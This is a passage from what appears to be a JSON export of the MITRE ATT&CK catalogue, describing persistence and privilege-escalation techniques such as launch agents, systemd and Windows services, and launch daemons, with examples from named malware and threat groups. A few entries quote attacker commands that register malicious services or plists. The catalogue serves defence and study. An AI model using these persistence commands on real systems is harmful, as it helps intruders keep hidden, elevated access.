configuration information used by the system to determine the execution order for all startup items.\nThis is technically a deprecated technology (superseded by Launch Daemon), and thus the appropriate folder, /Library/StartupItems isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory.\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism. Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.", "id": "T1037.005", "examples": [{"id": "S0283", "name": "jRAT", "description": "jRAT can list and manage startup entries."}]}]}, {"name": "Create or Modify System Process", "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.", "detailed_description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.", "id": "T1543", "examples": [{"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader modifies Windows tasks on the victim machine to reference a retrieved PE file through a path modification."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA can initialize itself as a daemon to run persistently in the background."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can create an arbitrary process with a specified command line and redirect its output to a staging directory."}], "sub_techniques": [{"name": "Launch Agent", "description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents.  Property list files use the Label, ProgramArguments , and RunAtLoad keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.", "detailed_description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents.  Property list files use the Label, ProgramArguments , and RunAtLoad keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\nLaunch Agents can also be executed using the Launchctl command.\nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.", "id": "T1543.001", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore can persist via a LaunchAgent."}, {"id": "S0274", "name": "Calisto", "description": "Calisto adds a .plist file to the /Library/LaunchAgents folder to maintain persistence."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software."}, {"id": "S0235", "name": "CrossRAT", "description": "CrossRAT creates a Launch Agent on macOS."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can achieve persistence by creating launch agents to repeatedly execute malicious payloads."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can establish persistence via a LaunchAgent."}, {"id": "S0281", "name": "Dok", "description": "Dok installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format com.random.name.plist."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly persists via a Launch Agent."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can create a Launch Agent with the RunAtLoad key-value pair set to true, ensuring the com.apple.GrowlHelper.plist file runs every time a user logs in."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap uses a Launch Agent to persist."}, {"id": "S0162", "name": "Komplex", "description": "The Komplex trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist."}, {"id": "S1016", "name": "MacMa", "description": "MacMa installs a com.apple.softwareupdate.plist file in the /LaunchAgents folder with the RunAtLoad value set to true. Upon user login, MacMa is executed from /var/root/.local/softwareupdate with root privileges. Some variations also include the LimitLoadToSessionType key with the value Aqua, ensuring the MacMa only runs when there is a logged in GUI user."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has placed a Stripped Payloads with a plist extension in the Launch Agent's folder. "}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy persists via a Launch Agent."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use launch agents for persistence."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D can create a persistence file in the folder /Library/LaunchAgents."}, {"id": "S0279", "name": "Proton", "description": "Proton persists via Launch Agent."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the ~/Library/LaunchAgents/ folder and configured with the path to the persistent binary located in the ~/Library/ folder."}]}, {"name": "Systemd Service", "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.", "detailed_description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.\nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME).\nInside the .service unit files, the following directives are used to execute commands:\nAdversaries have created new service files, altered the commands a .service file\u2019s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.\nThe .service file\u2019s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.", "id": "T1543.002", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the WantedBy=multi-user.target configuration to run GOGETTER when the system begins accepting user logins."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has established persistence using a systemd service."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has started a monero service."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can be used to establish persistence using a systemd service."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has installed a systemd service script to maintain persistence."}, {"id": "S1078", "name": "RotaJakiro", "description": "Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a .service file under the /lib/systemd/system/ folder."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can copy a script to the user owned /usr/lib/systemd/system/ directory with a symlink mapped to a root owned directory, /etc/ystem/system, in the unit configuration file's ExecStart directive to establish persistence and elevate privileges."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has established persistence through the creation of a cryptocurrency mining system service using systemctl."}]}, {"name": "Windows Service", "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.", "detailed_description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the sc sdset command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as Get-Service, sc query, and services.exe.", "id": "T1543.003", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. "}, {"id": "G1030", "name": "Agrius", "description": "Agrius has deployed IPsec Helper malware post-exploitation and registered it as a service for persistence."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can establish persistence by creating a service."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus can install itself as a service."}, {"id": "G0073", "name": "APT19", "description": "An APT19 Port 22 malware variant registers itself as a service."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that creates a new service for persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 modified Windows Services to ensure PowerShell scripts were loaded on the system. APT32 also creates a Windows service to establish persistence."}, {"id": "G0082", "name": "APT38", "description": "APT38 has installed a new Windows service to establish persistence."}, {"id": "G0096", "name": "APT41", "description": "APT41 modified legitimate Windows services to install malware backdoors. APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda created new Windows services for persistence that masqueraded as legitimate Windows services via name change."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can establish persistence by registering a new service."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred is installed as a new service on the system."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot can terminate a specific process by its process id."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can modify service configurations."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has been modified to be used as a Windows service."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer has attempted to install itself as a service to maintain persistence."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can create a new service to establish persistence."}, {"id": "S0089", "name": "BlackEnergy", "description": "One variant of BlackEnergy creates a new service using either a hard-coded or randomly generated name."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service."}, {"id": "S0204", "name": "Briba", "description": "Briba installs a service pointing to a malicious DLL dropped to disk."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges."}, {"id": "S0335", "name": "Carbon", "description": "Carbon establishes persistence by creating a service and naming it based off the operating system version running on the current machine."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas adds a new service named NetAdapter to establish persistence."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has created system services to establish persistence for deployed tooling."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can register itself as a system service to gain persistence."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has created new services to establish persistence."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can install a new service."}, {"id": "S0608", "name": "Conficker", "description": "Conficker copies itself into the %systemroot%\\system32 directory and registers as a service."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke uses Windows services typically named \"javamtsup\" for persistence."}, {"id": "S0046", "name": "CozyCar", "description": "One persistence mechanism used by CozyCar is to register itself as a Windows service."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can modify services by using the OpenService and ChangeServiceConfig functions."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya created new services for shellcode loaders distribution."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv has created new services for persistence by modifying the Registry."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can add a service called WBService to establish persistence."}, {"id": "S0038", "name": "Duqu", "description": "Duqu creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN can persist as a Windows Service in operations."}, {"id": "S0024", "name": "Dyre", "description": "Dyre registers itself as a service by adding several Registry keys."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca created a service using the command sc create \"SysUpdate\" binpath= \"cmd /c start \"[file path]\"\"&&sc config \"SysUpdate\" start= auto&&netstart SysUpdate for persistence."}, {"id": "S0081", "name": "Elise", "description": "Elise configures itself as a service."}, {"id": "S0082", "name": "Emissary", "description": "Emissary is capable of configuring itself as a service."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed creating new services to maintain persistence."}, {"id": "S0363", "name": "Empire", "description": "Empire can utilize built-in modules to modify service binaries and restore them to their original state."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description \"Windows Check AV.\""}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL has been installed as a Windows service."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 created new Windows services and added them to the startup directories for persistence."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher creates a new Windows service with the malicious executable for persistence."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has established persistence by running sc.exe and by setting the WSearch service to run automatically."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can drop itself in C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can create a new service to establish persistence."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has established persistence by running in the background as an autostart service."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy chooses a service, drops a DLL file, and writes it to that serviceDLL Registry key."}, {"id": "S0071", "name": "hcdLoader", "description": "hcdLoader installs itself as a service for persistence."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can load drivers by creating a new service using the CreateServiceW API."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates new services to establish persistence."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary."}, {"id": "S0259", "name": "InnaputRAT", "description": "Some InnaputRAT variants create a new Windows service to establish persistence."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has registered itself as a service to establish persistence."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar can install itself as a new service."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang backdoor RoyalDNS established persistence through adding a service called Nwsapagent."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy installs a service pointing to a malicious DLL dropped to disk."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has created new services for persistence."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has registered itself as a service using its export function."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs creates a new service named WmiApSrvEx to establish persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Several Lazarus Group malware families install themselves as new services."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance."}, {"id": "S0205", "name": "Naid", "description": "Naid creates a new service to establish."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can create a service to establish persistence."}, {"id": "S0210", "name": "Nerex", "description": "Nerex creates a Registry subkey that registers a new service."}, {"id": "S0118", "name": "Nidiran", "description": "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager)."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has created a Windows service named WmdmPmSp to establish persistence."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can create the services httpsvc and w3esvc for persistence ."}, {"id": "S0439", "name": "Okrum", "description": "To establish persistence, Okrum can install itself as a new service named NtmSsvc."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors modified the IKEEXT and PrintNotify Windows services for persistence."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, threat actors installed DLLs and backdoors as Windows services."}, {"id": "S0664", "name": "Pandora", "description": "Pandora has the ability to gain system privileges through Windows services."}, {"id": "S1031", "name": "PingPull", "description": "PingPull has the ability to install itself as a service."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can be added as a service to establish persistence. PlugX also has a module to change service configurations as well as start, control, and delete services."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a Registry subkey that registers a new service. PoisonIvy also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created new services and modified existing services for persistence."}, {"id": "S0029", "name": "PsExec", "description": "PsExec can leverage Windows services to escalate privileges from administrator to SYSTEM with the -s argument."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can remotely create a temporary service on a target host."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has used sc.exe to create a new service for the VirtualBox driver."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use services to establish persistence."}, {"id": "S0169", "name": "RawPOS", "description": "RawPOS installs itself as a service to maintain persistence."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has created a service when it is installed on the victim machine."}, {"id": "S0172", "name": "Reaver", "description": "Reaver installs itself as a new service."}, {"id": "S0074", "name": "Sakula", "description": "Some Sakula samples install themselves as services for persistence by calling WinExec with the net start argument."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can create a service at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost to trigger execution and maintain persistence."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt is capable of installing itself as a service."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon creates a new service named \"ntssrv\" to execute the payload. Newer versions create the \"MaintenaceSrv\" and \"hdv_725x\" services."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has installed a Windows service to maintain persistence on victim machines."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can establish persistence by creating a new service."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has created a service on victim machines named \"TaskFrame\" to establish persistence."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has the ability to create the following Windows service to establish persistence on an infected host: sc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback_whale\" start= \"auto\" obj= \"LocalSystem\"."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has created new services and modified existing services for persistence."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses a driver registered as a boot start service as the main load-point."}, {"id": "S1049", "name": "SUGARUSH", "description": "SUGARUSH has created a service named Service1 for persistence."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can create a service to establish persistence."}, {"id": "S0164", "name": "TDTESS", "description": "If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used malware that adds cryptocurrency miners as a service."}, {"id": "S0560", "name": "TEARDROP", "description": "TEARDROP ran as a Windows service from the c:\\windows\\syswow64 folder."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390's malware can create a new service, sometimes naming it after the config information, to gain persistence."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can run in memory and register its payload as a Windows service."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot can install as a Windows service for persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME variants can add malicious DLL modules as new services.TYPEFRAME can also delete services from the victim\u2019s machine."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has registered a service, typically named WerFaultSvc, to decrypt and find a kernel driver and kernel driver loader to maintain persistence."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has registered itself as a system service in the Registry for automatic execution at system startup."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry creates the service \"mssecsvc2.0\" with the display name \"Microsoft Security Center (2.0) Service.\""}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker created and established a service that runs until the encryption process is complete."}, {"id": "S0206", "name": "Wiarp", "description": "Wiarp creates a backdoor through which remote attackers can create a service."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows sets its DLL file as a new service in the Registry to establish persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT can add a new service to ensure PlugX persists on the system when delivered as another payload onto the system."}, {"id": "S0086", "name": "ZLib", "description": "ZLib creates Registry keys to allow itself to run as various services."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has established persistence by adding itself as a new service."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can create a new service using the service parser function ProcessScCommand."}]}, {"name": "Launch Daemon", "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/. Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.", "detailed_description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/. Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\nAdversaries may install a Launch Daemon configured to execute at startup by using the RunAtLoad parameter set to true and the Program parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as usr/local/bin to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.", "id": "T1543.004", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has placed a plist file within the LaunchDaemons folder and launched it manually."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore can persist via a LaunchDaemon."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will create a daemon for timed check-ins with command and control infrastructure."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can establish persistence via a Launch Daemon."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can add a plist file in the Library/LaunchDaemons to establish persistence."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner adds plist files with the naming format com.[random_name].plist in the /Library/LaunchDaemons folder with the RunAtLoad and KeepAlive keys set to true."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "If running with root permissions, OSX_OCEANLOTUS.D can create a persistence file in the folder /Library/LaunchDaemons."}, {"id": "S0595", "name": "ThiefQuest", "description": "When running with root privileges after a Launch Agent is installed, ThiefQuest installs a plist file to the /Library/LaunchDaemons/ folder with the RunAtLoad key set to true establishing persistence as a Launch Daemon. "}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim."}]}, {"name": "Container Service", "description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.", "detailed_description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\nFor example, by using the docker run or podman run command with the restart=always directive, a container can be configured to persistently restart on the host. A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.\nIn Kubernetes environments, DaemonSets allow an adversary to persistently Deploy Containers on all nodes, including ones added later to the cluster. Pods can also be deployed to specific nodes using the nodeSelector or nodeName fields in the pod spec.\nNote that containers can also be configured to run as Systemd Services.", "id": "T1543.005", "examples": []}]}, {"name": "Domain or Tenant Policy Modification", "description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.", "detailed_description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.", "id": "T1484", "examples": [], "sub_techniques": [{"name": "Group Policy Modification", "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.", "detailed_description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.\nFor example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying 